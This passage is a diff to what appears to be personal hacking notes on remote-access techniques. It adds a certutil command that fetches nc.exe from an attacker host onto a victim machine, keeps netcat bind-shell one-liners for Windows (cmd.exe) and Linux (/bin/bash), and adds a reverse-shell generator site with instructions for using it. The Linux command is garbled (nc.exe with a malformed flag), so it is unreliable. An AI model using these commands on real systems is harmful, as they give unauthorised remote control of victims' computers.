@@ -3198,8 +3198,9 @@ nc -nvlp <port>
 
 - first we send the nc.exe to the target system
 - `/usr/share/windows-binaries` is the path of nc.exe and use `python -m SimpleHTTPServer 80` then open target browser entry attacker ip and download nc.exe
+- `certutil -urlcache -f http://<attacker-IP>/nc.exe nc.exe` run this on victum system cmd to get the nc.exe instead of open browser and enter ip to dowload
 
-- **for Window**
+***for Window***
 
 ```shell
 nc.exe -nvlp 1234 -e cmd.exe
@@ -3211,7 +3212,7 @@ nc -nv <target-IP> 1234
 ```
 > run this on attacker system to get the remote access of victum
 
-- **for linux**
+***for linux***
 
 ```shell
 nc.exe -n nvlp 1234 -c /bin/bash
@@ -3222,3 +3223,10 @@ nc.exe -n nvlp 1234 -c /bin/bash
 nc -nv <target-IP> 1234
 ```
 > run this on attacker system to get the remote access of victum
+
+***cheatSheet***
+
+```url
+https://www.revshells.com/
+```
+> There is a website where we can generate a reverse shell payload by entering the attacker's IP address and port (e.g., 1234). After generating the payload, we execute the `nc -nvlp 1234` command on the attacker's system to start a listener. Once the generated payload is executed on the victim's system on cmd, it establishes a connection back to the attacker's machine, granting remote access.
